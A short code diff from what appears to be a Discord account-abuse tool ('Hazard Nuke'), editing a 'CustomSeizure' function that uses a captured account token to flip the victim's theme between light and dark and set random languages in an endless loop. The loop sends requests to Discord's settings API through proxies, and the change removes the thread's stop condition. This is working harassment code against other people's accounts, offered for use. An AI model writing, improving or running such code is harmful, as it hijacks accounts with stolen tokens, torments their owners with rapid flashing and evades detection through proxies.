@@ -100,8 +100,9 @@ def Hazard_Nuke(token, Server_Name, message_Content):
 def CustomSeizure(token):
     print(f'{Fore.MAGENTA}Starting seizure mode {Fore.RESET}{Fore.WHITE}(Switching on/off Light/dark mode){Fore.RESET}\n')
     t = threading.currentThread()
-    while getattr(t, "do_run", True):
-        modes = cycle(["light", "dark"])
+    modes = ["light", "dark"]
+    while True:
+        modes.append(modes.pop(0))
         #cycle between light/dark mode and languages
-        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
+        setting = {'theme': modes[0], 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
         requests.patch("https://discord.com/api/v7/users/@me/settings", proxies={"http": f'{proxy()}'}, headers=getheaders(token), json=setting)
